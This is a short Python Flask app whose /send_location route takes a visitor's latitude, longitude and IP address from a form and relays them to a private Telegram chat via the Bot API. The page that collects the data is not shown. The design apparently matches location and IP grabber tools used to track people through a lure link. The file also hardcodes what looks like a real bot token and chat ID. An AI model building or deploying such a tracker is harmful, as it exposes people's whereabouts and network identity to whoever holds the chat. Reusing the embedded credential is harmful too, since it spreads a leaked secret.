from flask import Flask, render_template, request
import requests

app = Flask(__name__)

@app.route('/')
def hello():
    return render_template('index.html')

@app.route('/send_location', methods=['POST'])
def send_location():
    latitude = request.form['latitude']
    longitude = request.form['longitude']
    ip_address = request.form['ip_address']
    
    # Send the location and IP address to Telegram using the Telegram Bot API
    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
    chat_id = '373715044'
    message = f"Latitude: {latitude}, Longitude: {longitude}, IP Address: {ip_address}"
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
    
    response = requests.get(api_url)
    if response.status_code == 200:
        return 'Location and IP sent successfully!'
    else:
        return 'Failed to send location and IP.'

if __name__ == '__main__':
    app.run()
	
